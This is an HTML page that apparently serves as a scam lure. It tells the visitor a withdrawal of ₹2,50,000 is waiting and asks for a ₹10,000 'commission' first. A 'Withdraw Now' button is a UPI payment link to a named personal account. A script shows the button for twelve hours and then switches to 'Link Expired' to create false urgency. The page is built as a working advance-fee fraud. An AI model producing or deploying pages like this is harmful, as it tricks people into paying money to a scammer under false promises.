<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdrawal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f2f2f2;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: auto;
    }
    .btn {
      background-color: #28a745;
      color: white;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      cursor: pointer;
    }
    .expired {
      color: red;
      font-weight: bold;
      font-size: 20px;
    }
    .info {
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Withdrawal Page</h2>
    <div class="info">
      <p>Your withdrawal amount is: <strong>₹2,50,000</strong></p>
      <p>You must pay <strong>₹10,000 commission</strong> to proceed with withdrawal.</p>
    </div>
    <div id="content">
      <!-- Button or Expired Message will go here -->
    </div>
  </div>

  <script>
    const TIMER_KEY = 'withdraw_timer_start';
    const contentDiv = document.getElementById('content');
    const now = Date.now();
    let startTime = localStorage.getItem(TIMER_KEY);

    if (!startTime) {
      localStorage.setItem(TIMER_KEY, now);
      startTime = now;
    }

    const timePassed = now - startTime;
    const hours12 = 12 * 60 * 60 * 1000;

    if (timePassed < hours12) {
      const button = document.createElement('a');
      button.className = 'btn';
      button.innerText = 'Withdraw Now';
      button.href = 'upi://pay?pa=6005973034@ybl&pn=ramchoudhary&am=10000&cu=INR';
      contentDiv.appendChild(button);
    } else {
      contentDiv.innerHTML = '<div class="expired">Link Expired</div>';
    }
  </script>
</body>
</html>
